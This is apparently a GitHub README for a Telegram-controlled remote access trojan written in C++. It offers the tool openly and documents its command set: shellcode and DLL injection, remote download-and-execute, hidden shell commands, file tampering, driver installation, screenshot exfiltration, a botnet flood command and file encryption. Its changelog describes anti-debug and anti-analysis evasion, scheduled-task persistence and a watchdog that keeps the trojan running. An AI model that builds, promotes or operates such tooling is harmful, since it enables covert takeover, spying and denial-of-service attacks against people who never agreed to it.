﻿# -= B4DB4B3-RAT =-
 Program for remote computer management using Telegram on C++ - by B4DB4B3   
 P.S: I didn't do animations on buttons. I can do it in the future, If you like the project
### [Interface]  
 ![UI](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/NEWUI.png)   
 ![EXAMPLE](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/COMMANDLIST.png)   
### [Weight of stub and builder]  
 #### Around 600-500 KB
 ![WEIGHT](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/WEIGHT.png)  


# [Commands (Will be added)]
<details>
	<summary>View command list</summary>
	
### Process manager:      
 Command name         | Parameters                             | Description
 -------------------- | -------------------------------------- | -----------
 /user[ID] processes  |                                        | get process list    
 /user[ID] closeproc  | [processname.exe]                      | close process    
 /user[ID] inject_dll | [processname.exe] [C:\Path\To\File.dll]| inject dll in process
 /user[ID] inject_shell | [processname.exe] [shellcode]          | inject shellcode in process
 
### Auxiliary: 
 Command name         | Parameters                                              | Description
 -------------------- | ------------------------------------------------------- | -----------
 /user[ID] loader     | [https://google.com/file.exe] [C:\ProgramData\file.exe] | upload file from [LINK] to [PATH]    
 /user[ID] run        | [C:\ProgramData\file.exe] [Args to run file / Or empty] | run file from [PATH] with arguments [ARGS]   
   
### Jokes:   
 Command name              | Parameters                                              | Description
 ------------------------- | ------------------------------------------------------- | -----------
 /user[ID] disable pc      |                                                         | disable computer of user    
 /user[ID] close           |                                                         | close user   
 /user[ID] disable display |                                                         | disable display user    
   
### File manager:
 Command name              | Parameters                                              | Description
 ------------------------- | ------------------------------------------------------- | -----------
 /user[ID] dir             | [C:\Folder]                                             | show files and folders in directory    
 /user[ID] dir del_file    | [C:\Path\To\File.exe]                                   | delete file in directory    
 /user[ID] dir write       | [C:\Path\To\File.txt] [Example text]                    | write text in file    
 /user[ID] dir read        | [C:\Path\To\File.txt]                                   | read text in file  

### Service manager:
 Command name              | Parameters                                              | Description
 ------------------------- | ------------------------------------------------------- | -----------
 /user[ID] service show    |                                                         | show all drivers in system    
 /user[ID] service add     | [Name] [DisplayName] [C:\ProgramData\yourdriver.sys] [Type-Driver] [Start-Type] | add your driver in system, Check Type-Driver and Start-Type values in "Service manager parse table"    
 /user[ID] service delete  | [NameService]                                           | delete driver from system
 /user[ID] service start   | [NameService]                                           | start the stopped service
 /user[ID] service stop    | [NameService]                                           | stop the started service


### Screen manager:
 Command name              | Parameters                                              | Description
 ------------------------- | ------------------------------------------------------- | -----------
 /user[ID] screenshot      |                                                         | take screenshot, upload her on prnt.sc and send you 

### BotNet:
 Command name              | Parameters                                              | Description
 ------------------------- | ------------------------------------------------------- | -----------
 /botnet start             | [https://google.com]                                    | all users send requests on site
 /botnet stop              |                                                         | stop sending requests

### CMD manager:
 Command name              | Parameters                                              | Description
 ------------------------- | ------------------------------------------------------- | -----------
 /user[ID] system          | [/c ping google.com]                                    | run cmd.exe with arguments (hidden)

### File cryptor:
 Command name              | Parameters                                              | Description
 ------------------------- | ------------------------------------------------------- | -----------
 /user[ID] filecrypt       | [C:\Path\To\File.exe] [yourkey]                         | crypt file with AES256
 /user[ID] filedecrypt     | [C:\Path\To\File.exe] [yourkey]                         | decrypt file with AES256

### RAT:   
 Command name              | Parameters                                              | Description
 ------------------------- | ------------------------------------------------------- | -----------
 /online                   |                                                         | show online users   

</details>
	
# [Coming soon]
- [x] Add file manager
- [x] Add function to get screenshot
   - [ ] Add function to record desktop
   - [ ] Add function to record microphone
- [x] Add more jokes (open url, block url, close process and etc.)
- [x] Add process control (inject dll, shellcode and etc.)
- [x] Add more information about PC 
- [x] Add Service manager (for deleting, showing and adding your system drivers)
- [x] Add Anti-analysis + Anti-debug functions
- [ ] Add mutual tracking between process-spy and RAT-process
# [CHANGELOG]
<details>
  <summary>View changelog</summary>
	
Date       | Time  | Description
---------- | ----- | -----------
17.10.2020 | 16:30 | Code is optimized, added commands   
18.10.2020 | 18:40 | Code is refactored and optimized, fixed bugs (command inject dll didn't work), added new function in builder (write in scheduler task), updated GUI, added re-launch protection, added commands ![NEWUI](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/NEWUI.png)
19.10.2020 | 01:30 | Deleted traces of debugging (sorry for this), added more information about PC ![NEWINFO](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/NEWINFO.png)
19.10.2020 | 17:20 | Clear warnings, added Service manager ![SERVICE](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/SERVICE.png)   
20.10.2020 | 11:19 | Code review, bug fix, added new function (screen manager) (wrote yourself api on wininet for work with prnt.sc api)    ![SCREEN](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/SCREENTOOL.png)  
20.10.2020 | 18:49 | Update GUI (change location objects)
24.10.2020 | 17:11 | Added function for inject shellcode in process ![SHELLCODE](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/INJECT_SHELL.png)
30.10.2020 | 14:29 | Added botnet ![BOTNET](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/BotNet.png)
03.11.2020 | 16:53 | Fixed command "system" (cmd manager). Added new commands in service manager (start, stop driver). Cmd manager: ![EXAMPLE1](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/system-example1.png) ![EXAMPLE2](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/system-example2.png) 
07.11.2020 | 22:16 | Code refactored. Warnings deleted. Added encryption for your botapi with AES256 (To avoid being stolen from hex). Update list of processes (AntiDebug). ![BeforeBotApi](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/Before_BotApi.png) ![AfterBotApi](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/After_BotApi.png)
08.11.2020 | 20:25 | Added file cryptor. See command list ![1](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/FileCrypt/1.png) ![2](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/FileCrypt/2.png) ![3](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/FileCrypt/3.png) ![4](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/FileCrypt/4.png)
19.11.2020 | 20:20 | Code refactored. Fixed command "dir del_file". Added commands in File Manager: "dir read" and "dir write" to read and write files (see command list) ![dir_read](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/dir/dir_read.png) ![dir_write](https://github.com/4B4DB4B3/B4DB4B3-RAT/blob/main/Screenshots/dir/dir_write.png)
12.02.2021 | 23:30 | Fix crash in Anti-Analysis & Anti-Debug function
30.05.2021 | 13:21 | A process is started that makes sure that the RAT does not close
</details>

## Service manager parse table:
### [service add] params [Type] driver
String param             | Value
------------------------ | --------------------------
win32-service            | SERVICE_WIN32
adapter-service          | SERVICE_ADAPTER
kernel-driver            | SERVICE_DRIVER
interactive-process      | SERVICE_INTERACTIVE_PROCESS
user-service              | SERVICE_USER_SERVICE
userservice-instance     | SERVICE_USERSERVICE_INSTANCE
pkg-service              | SERVICE_PKG_SERVICE


### [service add] param [StartType] driver

String param             | Value
------------------------ | --------------------------
auto-start               | SERVICE_AUTO_START
boot-start               | SERVICE_BOOT_START
demand-start             | SERVICE_DEMAND_START
disabled                 | SERVICE_DISABLED
system-start             | SERVICE_SYSTEM_START

#### Read more here: https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea

# [LICENSE]
 ![B4DB4B3-RAT](https://github.com/4B4DB4B3/B4DB4B3-RAT) is licensed under MIT License - https://mit-license.org/
